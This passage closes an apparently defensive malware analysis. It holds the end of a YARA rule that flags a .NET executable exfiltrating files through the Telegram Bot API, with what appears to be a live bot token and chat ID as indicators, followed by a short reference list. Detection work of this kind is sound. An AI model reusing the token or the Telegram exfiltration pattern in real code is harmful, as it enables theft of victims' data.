        $lib_costura = "Costura" ascii
        $lib_ionic_zip = "Ionic.Zip" ascii

		$telegram_api = "https://api.telegram.org/bot" ascii
        $telegram_send_document = "sendDocument?chat_id=" ascii
        $telegram_bot_token = "8013735771:AAE_UrTgQsAmiAsXeDN6mehD_fo3vEg-kCM" ascii
        $telegram_chat_id = "7613862165" ascii

        $pe_mz = { 4D 5A }

    condition:
        $pe_mz at 0 and
        filesize > 5MB and filesize < 8MB and
        (
            6 of ($string_*, $class_*, $lib_*, $telegram_*)
        )
}
```

# References

1. MITRE ATT&CK. [https://attack.mitre.org/](https://attack.mitre.org/).
2. VirusTotal. [https://virustotal.com](https://virustotal.com).
3. ChatGPT. [https://www.chatgpt.com](https://Chatgpt.com).
4. Microsoft C# Documentation. [https://docs.microsoft.com/en-us/dotnet/csharp/](https://docs.microsoft.com/en-us/dotnet/csharp/) - Used to understand C# code structure.
7. Telegram Bot API. [https://core.telegram.org/bots/api](https://core.telegram.org/bots/api) - Reference for understanding Telegram C2 communication.
